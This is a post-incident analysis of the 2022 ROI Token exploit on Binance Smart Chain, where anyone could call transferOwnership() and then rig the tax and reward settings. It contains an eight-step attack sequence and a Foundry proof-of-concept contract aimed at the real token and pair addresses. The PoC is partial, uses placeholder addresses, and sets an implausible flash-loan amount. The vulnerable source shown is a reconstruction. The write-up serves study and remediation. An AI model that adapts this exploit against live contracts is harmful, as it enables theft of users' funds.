# ROI Token — Unauthorized Ownership Takeover and Reward System Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-09 |
| **Protocol** | ROI Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | 157.98 BNB (~$44,000) |
| **Attack Tx** | [0x0e14cb7eabeeb2a819c52f313c986a877c1fa19824e899d1b91875c11ba053b0](https://bscscan.com/tx/0x0e14cb7eabeeb2a819c52f313c986a877c1fa19824e899d1b91875c11ba053b0) |
| **Attacker** | [0x91b7f203ed71c5eccf83b40563e409d2f3531114](https://bscscan.com/address/0x91b7f203ed71c5eccf83b40563e409d2f3531114) |
| **Attack Contract** | [0x158af3d23d96e3104bcc65b76d1a6f53d0f74ed0](https://bscscan.com/address/0x158af3d23d96e3104bcc65b76d1a6f53d0f74ed0) |
| **ROI Token** | [0xE48b75dc1b131fd3A8364b0580f76eFD04cF6e9c](https://bscscan.com/address/0xE48b75dc1b131fd3A8364b0580f76eFD04cF6e9c) |
| **BUSD/ROI Pair** | [0x745D6Dd206906dd32b3f35E00533AD0963805124](https://bscscan.com/address/0x745D6Dd206906dd32b3f35E00533AD0963805124) |
| **PancakeRouter** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **BUSD** | [0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56](https://bscscan.com/address/0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56) |
| **Root Cause** | No access control on `transferOwnership()` — anyone can seize ownership and manipulate token parameters |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/ROI_exp.sol) |

---
## 1. Vulnerability Overview

ROI Token is a reward-distribution token in the Reflect.finance family. The `transferOwnership()` function lacked access control, allowing anyone to seize contract ownership. The attacker first purchased approximately 111.29 billion ROI with 5 BNB, then obtained ownership via `transferOwnership()`. They then removed the fee with `setTaxFeePercent(0)`, excluded major holders from reward tracking via `excludeFromReward()`, and dumped a large amount of ROI into the BUSD/ROI pair. Finally, by combining a 99% tax setting with a flash loan, the attacker abused the reward distribution logic to extract 157.98 BNB.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable transferOwnership() — no access control
contract ROIToken is Ownable {
    // ❌ Ownable's standard transferOwnership has onlyOwner, but
    // this implementation removes the protection via override
    function transferOwnership(address newOwner) public override {
        // ❌ No onlyOwner check — anyone can transfer ownership
        _transferOwnership(newOwner);
    }
}

// Functions available to the attacker after ownership takeover
contract ROIToken is Ownable {
    function setTaxFeePercent(uint256 taxFee) external onlyOwner {
        _taxFee = taxFee; // Can be set to 0%
    }

    function excludeFromReward(address account) external onlyOwner {
        // ❌ Removes major holders from reward tracking
        // Their tokens are subsequently excluded from reward calculations
        _isExcluded[account] = true;
    }

    function includeInReward(address account) external onlyOwner {
        // ❌ Adds back to reward tracking → triggers _rOwned recalculation
        _isExcluded[account] = false;
        _tOwned[account] = 0;
        // Reward manipulation possible during recalculation
    }
}

// ✅ Correct transferOwnership
function transferOwnership(address newOwner) public override onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is zero address");
    _transferOwnership(newOwner);
}
```


### On-Chain Original Code

Source: Source unverified

> ⚠️ No on-chain source code — bytecode only or source not verified

**Vulnerable Function** — `transferOwnership()`:
```solidity
// ❌ Root cause: No access control on `transferOwnership()` — anyone can seize ownership and manipulate token parameters
// Source code unverified — bytecode analysis required
// Vulnerability: No access control on `transferOwnership()` — anyone can seize ownership and manipulate token parameters
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] 5 BNB → BUSD → ROI swap
    │       Acquired ~111,290,000,000 ROI
    │
    ├─[2] Call transferOwnership(attacker)
    │       ❌ No access control → ownership takeover successful
    │
    ├─[3] setTaxFeePercent(0): Set fee rate to 0%
    │
    ├─[4] excludeFromReward(holder1, holder2, ...)
    │       Exclude major holders from reward tracking
    │
    ├─[5] Transfer 111,190,000,000 ROI to BUSD/ROI pair
    │       (Pair ROI reserve increases significantly)
    │
    ├─[6] setTaxFeePercent(99): Set tax to 99%
    │       Flash loan via swap() borrows 4,340,000,000 ROI
    │       Callback returns ROI to pair → 99% fee accumulates in pair
    │
    ├─[7] setTaxFeePercent(0): Reset to 0%
    │       includeInReward(pair): Re-include pair in reward tracking
    │       → _rOwned recalculation → reward distortion
    │
    └─[8] Remaining ROI → BUSD → WBNB reverse swap
              Net profit: 157.98 BNB
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IROIToken {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    // ❌ Admin functions with no access control
    function transferOwnership(address newOwner) external;
    function setTaxFeePercent(uint256 taxFee) external;
    function excludeFromReward(address account) external;
    function includeInReward(address account) external;
}

interface IPancakePair {
    function swap(uint256, uint256, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract ROIExploit is Test {
    IROIToken roi = IROIToken(0xE48b75dc1b131fd3A8364b0580f76eFD04cF6e9c);
    IPancakePair pair = IPancakePair(0x745D6Dd206906dd32b3f35E00533AD0963805124);

    function setUp() public {
        vm.createSelectFork("bsc", 21_143_795);
        vm.deal(address(this), 5 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] BNB balance", address(this).balance, 18);

        // [Step 1] 5 BNB → BUSD → ROI swap
        // (Acquire 111.29B ROI via PancakeRouter)

        emit log_named_decimal_uint("[After ROI purchase] ROI balance", roi.balanceOf(address(this)), 18);

        // [Step 2] Ownership takeover
        // ⚡ transferOwnership() has no onlyOwner
        roi.transferOwnership(address(this));

        // [Step 3] Set fee to 0%
        roi.setTaxFeePercent(0);

        // [Step 4] Exclude major holders from rewards
        roi.excludeFromReward(0xSomeHolder1);
        roi.excludeFromReward(0xSomeHolder2);

        // [Step 5] Dump large amount of ROI into pair
        roi.transfer(address(pair), roi.balanceOf(address(this)) * 99 / 100);

        // [Step 6] 99% tax + flash loan to distort rewards
        roi.setTaxFeePercent(99);
        (uint112 r0, , ) = pair.getReserves();
        pair.swap(0, uint256(r0) * 4340 / 100, address(this), abi.encode("exploit"));

        // [Step 7] Trigger reward recalculation via includeInReward
        roi.setTaxFeePercent(0);
        roi.includeInReward(address(pair));

        // [Step 8] Remaining ROI → BNB reverse swap
        emit log_named_decimal_uint("[End] BNB balance", address(this).balance, 18);
    }

    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        // Return borrowed ROI to pair → 99% fee accumulates
        roi.transfer(address(pair), amount0);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Unauthorized ownership takeover + reward system manipulation |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Admin privilege hijacking |
| **Attack Vector** | Unprotected `transferOwnership()` → tax/reward parameter manipulation |
| **Precondition** | `onlyOwner` removed when overriding `transferOwnership()` |
| **Impact** | 157.98 BNB (~$44,000) loss |

---
## 6. Remediation Recommendations

1. **Always protect `transferOwnership()`**: When overriding `transferOwnership()` while inheriting OpenZeppelin's `Ownable`, the `onlyOwner` modifier must be preserved.
2. **Two-step ownership transfer**: Use the safer `transferOwnership` + `acceptOwnership()` two-step pattern instead of a single-step transfer to prevent unintended ownership transfers.
3. **Audit admin functions in Reflect forks**: Reflect.finance fork tokens have powerful state-manipulation functions such as `excludeFromReward`, `includeInReward`, and `setTaxFeePercent`. All of these must be protected with `onlyOwner` and have their parameter ranges restricted.

```solidity
// ✅ Safe two-step ownership transfer
import "@openzeppelin/contracts/access/Ownable2Step.sol";

contract SafeROIToken is Ownable2Step {
    // transferOwnership() → acceptOwnership() two-step pattern provided automatically
    // Also prevents accidentally transferring ownership to a wrong address
}
```

---
## 7. Lessons Learned

- **The pitfall of OpenZeppelin inheritance**: When overriding `transferOwnership()` while inheriting `Ownable`, omitting the `super` call or removing the modifier introduces a critical vulnerability. Security properties of the original must always be preserved when overriding.
- **Complexity of the Reflect token model**: The dual-balance structure of `_rOwned`/`_tOwned` and the `excludeFromReward`/`includeInReward` mechanism have complex interactions that enable a wide range of attack scenarios upon admin privilege takeover.
- **Large losses from small capital**: The attacker invested only 5 BNB ($1,500) to extract 157.98 BNB ($44,000). Access control vulnerabilities can produce outsized damage through leverage even with minimal initial capital.